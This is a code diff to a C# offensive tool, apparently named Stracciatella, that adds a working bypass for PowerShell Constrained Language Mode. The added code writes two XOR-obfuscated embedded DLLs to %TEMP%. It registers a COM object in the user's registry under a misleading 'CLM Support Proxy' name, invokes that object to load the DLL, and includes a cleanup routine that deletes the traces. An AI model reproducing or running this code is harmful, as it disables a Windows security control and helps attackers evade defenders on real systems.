@@ -16,10 +16,102 @@ namespace Stracciatella
     {
         private static bool Verbose = false;
 
+        private static string COM_NAME = "Clm";
+        private static string COM_DESCRIPTION = "CLM Support Proxy";
+        private static string COM_GUID = "{394aaa50-684e-4870-911a-d045293b3b13}";
+
+        // This has to be %TEMP% as other projects have that path hardcoded. 
+        private static string OUTPUT_CLMDISABLEASSEMBLY_PATH = @"%TEMP%\ClmDisableAssembly.dll";
+        private static string OUTPUT_CLMDISABLEDLL_PATH = @"%TEMP%\ClmDisableDll.dll";
+
+
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
         static extern int GetCurrentThreadId();
 
-        private static bool ClmDisabler(PowerShell rs)
+        private static bool CreateCOM(PowerShell rs, CustomPSHost host, bool deregister = false)
+        {
+            string dllPath = @"$($Env:Temp)\ClmDisableDll.dll";
+
+            // Well I'm to lazy to reimplement it in C#
+            string registerCOM = @"
+                $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;
+
+                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
+                $key = 'HKU:\{0}_classes' -f $sid;
+
+                $key = 'HKU:\{0}_classes\CLSID\' -f $sid;
+                New-Item -Force -Path $key -Name """ + COM_GUID + @""";
+                $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
+                New-Item -Force -Path $key -Name 'InProcServer32';
+                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_DESCRIPTION + @""" -PropertyType String;
+                $key = 'HKU:\{0}_classes\CLSID\{1}\InProcServer32' -f $sid, """ + COM_GUID + @""";
+                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + dllPath + @""" -PropertyType String;
+                New-ItemProperty -Force -Path $key -Name 'ThreadingModel' -Value ""Apartment"" -PropertyType String;
+
+                $key = 'HKU:\{0}_classes' -f $sid;
+                New-Item -Force -Path $key -Name """ + COM_NAME + @""";
+                $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
+                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_DESCRIPTION + @""" -PropertyType String;
+                New-Item -Force -Path $key -Name 'CLSID';
+                $key = 'HKU:\{0}_classes\{1}\CLSID' -f $sid, """ + COM_NAME + @""";
+                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_GUID + @""" -PropertyType String;
+";
+            string deregisterCOM = $@"
+                $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;
+
+                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null;
+                $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
+                Remove-Item -Force -Path $key -Recurse | Out-Null;
+
+                $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
+                Remove-Item -Force -Path $key -Recurse | Out-Null;
+";
+            if (deregister)
+            {
+                return Stracciatella.ExecuteCommand(deregisterCOM, rs, host, true, true).Length > 0;
+            }
+            else
+            {
+                return Stracciatella.ExecuteCommand(registerCOM, rs, host, true, true).Length > 0;
+            }
+        }
+
+        public static bool ProperDisable(PowerShell rs, CustomPSHost host)
+        {
+            if (DisableClm.Verbose) Console.WriteLine("[.] Step 0. Plant DLL files in: %TEMP%");
+
+            using (BinaryWriter file = new BinaryWriter(File.Open(
+                Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH),
+                FileMode.Create)))
+            {
+                byte[] data = Decoder.XorDecodeBinary(ClmEmbeddedFiles.ClmDisableAssemblyData, ClmEmbeddedFiles.FilesXorKey);
+                file.Write(data);
+            }
+
+            using (BinaryWriter file = new BinaryWriter(File.Open(
+                Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH),
+                FileMode.Create)))
+            {
+                byte[] data = Decoder.XorDecodeBinary(ClmEmbeddedFiles.ClmDisableDllData, ClmEmbeddedFiles.FilesXorKey);
+                file.Write(data);
+            }
+
+            if (DisableClm.Verbose) Console.WriteLine("[.] Step 1. Creating custom COM object.");
+            if(!CreateCOM(rs, host))
+            {
+                if (DisableClm.Verbose) Console.WriteLine("[-] Could not register custom COM object. CLM bypass failed.");
+                return false;
+            }
+
+            if (DisableClm.Verbose) Console.WriteLine("[.] Step 2. Invoking it...");
+            if (DisableClm.Verbose) Stracciatella.ExecuteCommand($"New-Object -ComObject {COM_NAME}", rs, host, true, false, false);
+
+            System.Threading.Thread.Sleep(1000);
+
+            return true;
+        }
+
+        private static bool NaiveTry(PowerShell rs)
         {
             bool ret = false;
 
@@ -59,10 +151,23 @@ namespace Stracciatella
             return ret;
         }
 
-        public static bool DoDisable(PowerShell rs, bool verb)
+        public static bool DoDisable(PowerShell rs, CustomPSHost host, bool verb)
         {
             DisableClm.Verbose = verb;
-            return ClmDisabler(rs);
+            NaiveTry(rs);
+
+            return ProperDisable(rs, host);
+        }
+
+        public static bool Cleanup(PowerShell rs, CustomPSHost host, bool verb)
+        {
+            if (verb) Console.WriteLine("[.] Cleaning up CLM disable artefacts...");
+            bool ret = CreateCOM(rs, host, true);
+
+            File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
+            File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
+
+            return ret;
         }
     }
 }
